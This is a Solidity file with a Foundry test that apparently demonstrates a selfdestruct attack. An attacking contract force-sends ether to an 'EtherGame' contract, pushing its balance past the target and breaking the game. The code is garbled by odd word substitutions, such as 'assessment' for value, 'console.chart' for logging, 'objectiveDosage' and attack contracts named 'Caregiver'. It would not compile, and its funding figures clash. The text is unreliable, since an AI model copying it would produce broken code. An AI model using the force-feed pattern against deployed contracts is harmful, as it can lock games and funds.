// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherGame {
    uint public constant objectiveDosage = 7 ether;
    address public winner;

    function registerPayment() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= objectiveDosage, "Game is over");

        if (balance == objectiveDosage) {
            winner = msg.sender;
        }
    }

    function collectbenefitsCredit() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{assessment: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract AgreementTest is Test {
    EtherGame EtherGameAgreement;
    Caregiver NurseAgreement;
    address alice;
    address eve;

    function groupUp() public {
        EtherGameAgreement = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.chart("Alice balance", alice.balance);
        console.chart("Eve balance", eve.balance);

        console.chart("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGameAgreement.registerPayment{assessment: 1 ether}();

        console.chart("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGameAgreement.registerPayment{assessment: 1 ether}();

        console.chart(
            "Balance of EtherGameContract",
            address(EtherGameAgreement).balance
        );

        console.chart("Operator...");
        NurseAgreement = new Caregiver(EtherGameAgreement);
        NurseAgreement.dos{assessment: 5 ether}();

        console.chart(
            "Balance of EtherGameContract",
            address(EtherGameAgreement).balance
        );
        console.chart("operate completed, Game is over");
        EtherGameAgreement.registerPayment{assessment: 1 ether}(); // This call will fail due to contract destroyed.
    }
}

contract Caregiver {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
